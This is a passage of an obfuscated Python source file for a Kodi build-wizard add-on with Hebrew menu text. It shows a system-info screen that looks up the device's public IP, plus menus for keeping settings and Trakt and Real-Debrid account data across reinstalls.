	O0O00OOOOOO00OO0O =OO0O000O00O000O00 .read ().replace ('\t','    ')#line:2753
	wiz .TextBox (ADDONTITLE ,O0O00OOOOOO00OO0O )#line:2754
	OO0O000O00O000O00 .close ()#line:2755
def removeAdvanced ():#line:2757
	if os .path .exists (ADVANCED ):#line:2758
		wiz .removeFile (ADVANCED )#line:2759
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2760
def showAutoAdvanced ():#line:2762
	notify .autoConfig ()#line:2763
def getIP ():#line:2765
	O0OOO000O00OO0OO0 ='http://whatismyipaddress.com/'#line:2766
	if not wiz .workingURL (O0OOO000O00OO0OO0 ):return 'Unknown','Unknown','Unknown'#line:2767
	OOO0O00O00O0000OO =wiz .openURL (O0OOO000O00OO0OO0 ).replace ('\n','').replace ('\r','')#line:2768
	if not 'Access Denied'in OOO0O00O00O0000OO :#line:2769
		OO00OOO00OOOO00OO =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OOO0O00O00O0000OO )#line:2770
		O0OO0OOO000OO0OO0 =OO00OOO00OOOO00OO [0 ]if (len (OO00OOO00OOOO00OO )>0 )else 'Unknown'#line:2771
		OO00O0O000O00O0O0 =re .compile ('"font-size:14px;">(.+?)</td>').findall (OOO0O00O00O0000OO )#line:2772
		OO0OOOOOO00OOOO00 =OO00O0O000O00O0O0 [0 ]if (len (OO00O0O000O00O0O0 )>0 )else 'Unknown'#line:2773
		O00OO0O0O00O00OO0 =OO00O0O000O00O0O0 [1 ]+', '+OO00O0O000O00O0O0 [2 ]+', '+OO00O0O000O00O0O0 [3 ]if (len (OO00O0O000O00O0O0 )>2 )else 'Unknown'#line:2774
		return O0OO0OOO000OO0OO0 ,OO0OOOOOO00OOOO00 ,O00OO0O0O00O00OO0 #line:2775
	else :return 'Unknown','Unknown','Unknown'#line:2776
def systemInfo ():#line:2778
	O00OO000OOO00O0OO =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2792
	OO0OO00O00O0O0O0O =[];OO00OOOOO000OO0O0 =0 #line:2793
	for O0O00O00OOOO0OOOO in O00OO000OOO00O0OO :#line:2794
		OOO00O00OO00O0O00 =wiz .getInfo (O0O00O00OOOO0OOOO )#line:2795
		OOO000OOO0OO0O0O0 =0 #line:2796
		while OOO00O00OO00O0O00 =="Busy"and OOO000OOO0OO0O0O0 <10 :#line:2797
			OOO00O00OO00O0O00 =wiz .getInfo (O0O00O00OOOO0OOOO );OOO000OOO0OO0O0O0 +=1 ;wiz .log ("%s sleep %s"%(O0O00O00OOOO0OOOO ,str (OOO000OOO0OO0O0O0 )));xbmc .sleep (1000 )#line:2798
		OO0OO00O00O0O0O0O .append (OOO00O00OO00O0O00 )#line:2799
		OO00OOOOO000OO0O0 +=1 #line:2800
	OOO0OO0O000OO0OOO =OO0OO00O00O0O0O0O [8 ]if 'Una'in OO0OO00O00O0O0O0O [8 ]else wiz .convertSize (int (float (OO0OO00O00O0O0O0O [8 ][:-8 ]))*1024 *1024 )#line:2801
	OO000O0OOO0OO0OO0 =OO0OO00O00O0O0O0O [9 ]if 'Una'in OO0OO00O00O0O0O0O [9 ]else wiz .convertSize (int (float (OO0OO00O00O0O0O0O [9 ][:-8 ]))*1024 *1024 )#line:2802
	O00OO0O00O000O000 =OO0OO00O00O0O0O0O [10 ]if 'Una'in OO0OO00O00O0O0O0O [10 ]else wiz .convertSize (int (float (OO0OO00O00O0O0O0O [10 ][:-8 ]))*1024 *1024 )#line:2803
	O0OOOO0000O0OOO00 =wiz .convertSize (int (float (OO0OO00O00O0O0O0O [11 ][:-2 ]))*1024 *1024 )#line:2804
	O00OO00O00O000OO0 =wiz .convertSize (int (float (OO0OO00O00O0O0O0O [12 ][:-2 ]))*1024 *1024 )#line:2805
	OO0OO0O000OOO0000 =wiz .convertSize (int (float (OO0OO00O00O0O0O0O [13 ][:-2 ]))*1024 *1024 )#line:2806
	O0O0OO00O000000OO ,OOO0OOOO00O0O00OO ,O000000OOO000OOOO =getIP ()#line:2807
	OOO000O000OO0000O =[];OO0O000O0O00OOO00 =[];O000O0O0O00O0O0O0 =[];O00O0OOOOOOO000O0 =[];O0O0O0O0O000000O0 =[];O00O0O0OOOO0000O0 =[];O0O0OOOOO0OO0O00O =[]#line:2809
	O000O000O0OOO0O00 =glob .glob (os .path .join (ADDONS ,'*/'))#line:2811
	for O0O00000OO00O000O in sorted (O000O000O0OOO0O00 ,key =lambda OO0O0OOOO00OO0O00 :OO0O0OOOO00OO0O00 ):#line:2812
		OO0O0000O000O0OOO =os .path .split (O0O00000OO00O000O [:-1 ])[1 ]#line:2813
		if OO0O0000O000O0OOO =='packages':continue #line:2814
		O00OO0000O000O00O =os .path .join (O0O00000OO00O000O ,'addon.xml')#line:2815
		if os .path .exists (O00OO0000O000O00O ):#line:2816
			O000000OOO0OOOO0O =open (O00OO0000O000O00O )#line:2817
			OO0O0O0O00O00O000 =O000000OOO0OOOO0O .read ()#line:2818
			O0O00O0O000O0O00O =re .compile ("<provides>(.+?)</provides>").findall (OO0O0O0O00O00O000 )#line:2819
			if len (O0O00O0O000O0O00O )==0 :#line:2820
				if OO0O0000O000O0OOO .startswith ('skin'):O0O0OOOOO0OO0O00O .append (OO0O0000O000O0OOO )#line:2821
				if OO0O0000O000O0OOO .startswith ('repo'):O0O0O0O0O000000O0 .append (OO0O0000O000O0OOO )#line:2822
				else :O00O0O0OOOO0000O0 .append (OO0O0000O000O0OOO )#line:2823
			elif not (O0O00O0O000O0O00O [0 ]).find ('executable')==-1 :O00O0OOOOOOO000O0 .append (OO0O0000O000O0OOO )#line:2824
			elif not (O0O00O0O000O0O00O [0 ]).find ('video')==-1 :O000O0O0O00O0O0O0 .append (OO0O0000O000O0OOO )#line:2825
			elif not (O0O00O0O000O0O00O [0 ]).find ('audio')==-1 :OO0O000O0O00OOO00 .append (OO0O0000O000O0OOO )#line:2826
			elif not (O0O00O0O000O0O00O [0 ]).find ('image')==-1 :OOO000O000OO0000O .append (OO0O0000O000O0OOO )#line:2827
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2829
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO00O00O0O0O0O [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2830
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO00O00O0O0O0O [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2831
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:2832
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO00O00O0O0O0O [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2833
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO00O00O0O0O0O [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2834
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2836
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO00O00O0O0O0O [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2837
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO00O00O0O0O0O [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2838
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2840
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OO0O000OO0OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2841
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O0OOO0OO0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2842
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OO0O00O000O000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2843
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2845
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOOO0000O0OOO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2846
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OO00O00O000OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2847
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O000OOO0000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2848
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2850
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO00O00O0O0O0O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2851
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OO00O000000OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2852
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OOOO00O0O00OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2853
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000000OOO000OOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2854
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO00O00O0O0O0O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2855
	O000OOO0OOOO00OOO =len (OOO000O000OO0000O )+len (OO0O000O0O00OOO00 )+len (O000O0O0O00O0O0O0 )+len (O00O0OOOOOOO000O0 )+len (O00O0O0OOOO0000O0 )+len (O0O0OOOOO0OO0O00O )+len (O0O0O0O0O000000O0 )#line:2857
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O000OOO0OOOO00OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2858
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000O0O0O00O0O0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2859
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00O0OOOOOOO000O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2860
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O000O0O00OOO00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2861
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO000O000OO0000O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2862
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0O0O0O000000O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2863
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0OOOOO0OO0O00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2864
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00O0O0OOOO0000O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2865
def Menu ():#line:2866
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2867
def saveMenu ():#line:2869
	OO0O0O000O0O0O000 ='[COLOR yellow]מופעל[/COLOR]';O000O0O0OO0OO0O0O ='[COLOR blue]מבוטל[/COLOR]'#line:2871
	O0O0OOOO0OOO0OOO0 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:2872
	O0OO00OO00O00O00O ='true'if KEEPMOVIELIST =='true'else 'false'#line:2873
	O0OOOO00O000OO000 ='true'if KEEPINFO =='true'else 'false'#line:2874
	OO0OOOOO0OOO0O000 ='true'if KEEPSOUND =='true'else 'false'#line:2876
	OO000O0000OOOO0OO ='true'if KEEPVIEW =='true'else 'false'#line:2877
	OO0OOO0O0O00OOO0O ='true'if KEEPSKIN =='true'else 'false'#line:2878
	O000OOO00O0O0O0OO ='true'if KEEPSKIN2 =='true'else 'false'#line:2879
	OO00OOO00000OOOOO ='true'if KEEPSKIN3 =='true'else 'false'#line:2880
	OO00OO0O0O000O000 ='true'if KEEPADDONS =='true'else 'false'#line:2881
	O00O0O00OOO0O00OO ='true'if KEEPPVR =='true'else 'false'#line:2882
	OO0000O0OO0O00O0O ='true'if KEEPTVLIST =='true'else 'false'#line:2883
	O0O000OOO0O000O00 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:2884
	O000O0OO0OO00000O ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:2885
	OO00OOO0O00000000 ='true'if KEEPHUBTV =='true'else 'false'#line:2886
	O0OO000OO000OO000 ='true'if KEEPHUBVOD =='true'else 'false'#line:2887
	OOOO000O0O000O0O0 ='true'if KEEPHUBSPORT =='true'else 'false'#line:2888
	O00OO00O0OOO00O0O ='true'if KEEPHUBKIDS =='true'else 'false'#line:2889
	OO000000O000O000O ='true'if KEEPHUBMUSIC =='true'else 'false'#line:2890
	OO00000OOOOOOOOOO ='true'if KEEPHUBMENU =='true'else 'false'#line:2891
	O0O0000000OO0O0OO ='true'if KEEPPLAYLIST =='true'else 'false'#line:2892
	O0O0000OOOOOO0000 ='true'if KEEPTRAKT =='true'else 'false'#line:2893
	O00O0OOOO0OO00000 ='true'if KEEPREAL =='true'else 'false'#line:2894
	OOO0O0O0O0O0O00O0 ='true'if KEEPRD2 =='true'else 'false'#line:2895
	OO00OO0O00O00000O ='true'if KEEPTORNET =='true'else 'true'#line:2896
	OOO0O000OO0O00O00 ='true'if KEEPLOGIN =='true'else 'false'#line:2897
	OOO000O0OOOO0OO0O ='true'if KEEPSOURCES =='true'else 'false'#line:2898
	OOO000O0O00OO0OO0 ='true'if KEEPADVANCED =='true'else 'false'#line:2899
	OOO0OO0O0OO0O0OOO ='true'if KEEPPROFILES =='true'else 'false'#line:2900
	OOOOOOO0O0OO0O000 ='true'if KEEPFAVS =='true'else 'false'#line:2901
	OOOO000000O0OO0OO ='true'if KEEPREPOS =='true'else 'false'#line:2902
	OOO0O000000OOO000 ='true'if KEEPSUPER =='true'else 'false'#line:2903
	O000O00O000O00O0O ='true'if KEEPWHITELIST =='true'else 'false'#line:2904
	O00O00OO0O00O0O0O ='true'if KEEPWEATHER =='true'else 'false'#line:2905
	if O000O00O000O00O0O =='true':#line:2909
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:2910
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:2911
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:2912
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:2913
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:2914
	addFile ('%s התקנת קיר סרטים: '%O0O0OOOO0OOO0OOO0 .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keepmoviewall',icon =ICONTRAKT ,themeit =THEME1 )#line:2916
	addFile ('%s שמירת חשבון RD:  '%O00O0OOOO0OO00000 .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:2917
	addFile ('%s שמירת חשבון טראקט:  '%O0O0000OOOOOO0000 .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:2918
	addFile ('%s שמירת מועדפים:  '%OOOOOOO0O0OO0O000 .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:2921
	addFile ('%s שמירת לקוח טלוויזיה:  '%O00O0O00OOO0O00OO .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:2922
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%OO0000O0OO0O00O0O .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:2923
	addFile ('%s שמירת אריח סרטים:  '%O0O000OOO0O000O00 .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:2924
	addFile ('%s שמירת אריח סדרות:  '%O000O0OO0OO00000O .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:2925
	addFile ('%s שמירת אריח טלויזיה:  '%OO00OOO0O00000000 .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:2926
	addFile ('%s שמירת אריח תוכן ישראלי:  '%O0OO000OO000OO000 .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:2927
	addFile ('%s שמירת אריח ספורט:  '%OOOO000O0O000O0O0 .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:2928
	addFile ('%s שמירת אריח ילדים:  '%O00OO00O0OOO00O0O .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:2929
	addFile ('%s שמירת אריח מוסיקה:  '%OO000000O000O000O .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:2930
	addFile ('%s שמירת תפריט אריחים ראשי:  '%OO00000OOOOOOOOOO .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:2931
	addFile ('%s שמירת כל האריחים בסקין:  '%OO0OOO0O0O00OOO0O .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:2932
	addFile ('%s שמירת הגדרות מזג האוויר:  '%O00O00OO0O00O0O0O .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:2933
	addFile ('%s שמירת הרחבות שהתקנתי:  '%OO00OO0O0O000O000 .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:2939
	addFile ('%s שמירת סיסמאות, חשבונות ,מיקומי הורדות:  '%O0OOOO00O000OO000 .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:2940
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%O0OO00OO00O00O00O .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:2943
	addFile ('%s שמירת מקורות וידאו:  '%OOO000O0OOOO0OO0O .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:2944
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%OO0OOOOO0OOO0O000 .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:2945
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%OO000O0000OOOO0OO .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:2947
	addFile ('%s שמירת פליליסט לאודר:  '%O0O0000000OO0O0OO .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:2948
	addFile ('%s שמירת הגדרות באפר: '%OOO000O0O00OO0OO0 .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:2953
	addFile ('%s שמירת רשימות ריפו:  '%OOOO000000O0OO0OO .replace ('true',OO0O0O000O0O0O000 ).replace ('false',O000O0O0OO0OO0O0O ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:2955
	setView ('files','viewType')#line:2957
def traktMenu ():#line:2959
	OOO00O0O0O0O0OO00 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:2960
	O00OOOOOO00OOO000 =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:2961
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:2962
	addFile ('Save Trakt Data: %s'%OOO00O0O0O0O0OO00 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:2963
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O00OOOOOO00OOO000 ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2964
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2965
	for OOO00O0O0O0O0OO00 in traktit .ORDER :#line:2967
		OOOOOO00OOO000OOO =TRAKTID [OOO00O0O0O0O0OO00 ]['name']#line:2968
		OO000OO0O0OOO0000 =TRAKTID [OOO00O0O0O0O0OO00 ]['path']#line:2969
		OOOO0OO00OO0OO0OO =TRAKTID [OOO00O0O0O0O0OO00 ]['saved']#line:2970
		OO0O00000O00O0O00 =TRAKTID [OOO00O0O0O0O0OO00 ]['file']#line:2971
		OOO000O00000O0000 =wiz .getS (OOOO0OO00OO0OO0OO )#line:2972
		O000O0000OOO0OOO0 =traktit .traktUser (OOO00O0O0O0O0OO00 )#line:2973
		OO0O0OOO0OOO0OOO0 =TRAKTID [OOO00O0O0O0O0OO00 ]['icon']if os .path .exists (OO000OO0O0OOO0000 )else ICONTRAKT #line:2974
		OO0O0OOO00OOO00O0 =TRAKTID [OOO00O0O0O0O0OO00 ]['fanart']if os .path .exists (OO000OO0O0OOO0000 )else FANART #line:2975
		O0O0O0OO0OOO00000 =createMenu ('saveaddon','Trakt',OOO00O0O0O0O0OO00 )#line:2976
		O00OO00O0OO000O0O =createMenu ('save','Trakt',OOO00O0O0O0O0OO00 )#line:2977
		O0O0O0OO0OOO00000 .append ((THEME2 %'%s Settings'%OOOOOO00OOO000OOO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,OOO00O0O0O0O0OO00 )))#line:2978
		addFile ('[+]-> %s'%OOOOOO00OOO000OOO ,'',icon =OO0O0OOO0OOO0OOO0 ,fanart =OO0O0OOO00OOO00O0 ,themeit =THEME3 )#line:2980
		if not os .path .exists (OO000OO0O0OOO0000 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO0O0OOO0OOO0OOO0 ,fanart =OO0O0OOO00OOO00O0 ,menu =O0O0O0OO0OOO00000 )#line:2981
		elif not O000O0000OOO0OOO0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',OOO00O0O0O0O0OO00 ,icon =OO0O0OOO0OOO0OOO0 ,fanart =OO0O0OOO00OOO00O0 ,menu =O0O0O0OO0OOO00000 )#line:2982
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O000O0000OOO0OOO0 ,'authtrakt',OOO00O0O0O0O0OO00 ,icon =OO0O0OOO0OOO0OOO0 ,fanart =OO0O0OOO00OOO00O0 ,menu =O0O0O0OO0OOO00000 )#line:2983
		if OOO000O00000O0000 =="":#line:2984
			if os .path .exists (OO0O00000O00O0O00 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',OOO00O0O0O0O0OO00 ,icon =OO0O0OOO0OOO0OOO0 ,fanart =OO0O0OOO00OOO00O0 ,menu =O00OO00O0OO000O0O )#line:2985
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',OOO00O0O0O0O0OO00 ,icon =OO0O0OOO0OOO0OOO0 ,fanart =OO0O0OOO00OOO00O0 ,menu =O00OO00O0OO000O0O )#line:2986
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOO000O00000O0000 ,'',icon =OO0O0OOO0OOO0OOO0 ,fanart =OO0O0OOO00OOO00O0 ,menu =O00OO00O0OO000O0O )#line:2987
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2989
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2990
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2991
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2992
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2993
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2994
	setView ('files','viewType')#line:2995
def realMenu ():#line:2997
	O00OO00O0O000O00O ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:2998
	O0O0O0O00O0000O0O =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:2999
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3000
	addFile ('Save Real Debrid Data: %s'%O00OO00O0O000O00O ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3001
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O0O0O0O00O0000O0O ),'',icon =ICONREAL ,themeit =THEME3 )#line:3002
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3003
	for OO0OOO000OO0O0O0O in debridit .ORDER :#line:3005
		O0O000OOO00OOOO00 =DEBRIDID [OO0OOO000OO0O0O0O ]['name']#line:3006
		OOOO00OOOO0O00OO0 =DEBRIDID [OO0OOO000OO0O0O0O ]['path']#line:3007
		OOOOOOOOOO0000000 =DEBRIDID [OO0OOO000OO0O0O0O ]['saved']#line:3008
		O00000OO0O000000O =DEBRIDID [OO0OOO000OO0O0O0O ]['file']#line:3009
		OOO000OOOOO00O0O0 =wiz .getS (OOOOOOOOOO0000000 )#line:3010
		O0O00000000OOOOOO =debridit .debridUser (OO0OOO000OO0O0O0O )#line:3011
		O0OOOOO0OOOOO00OO =DEBRIDID [OO0OOO000OO0O0O0O ]['icon']if os .path .exists (OOOO00OOOO0O00OO0 )else ICONREAL #line:3012
		OOO0O0000000O00O0 =DEBRIDID [OO0OOO000OO0O0O0O ]['fanart']if os .path .exists (OOOO00OOOO0O00OO0 )else FANART #line:3013
		O0OO0O00OO0OO0OOO =createMenu ('saveaddon','Debrid',OO0OOO000OO0O0O0O )#line:3014
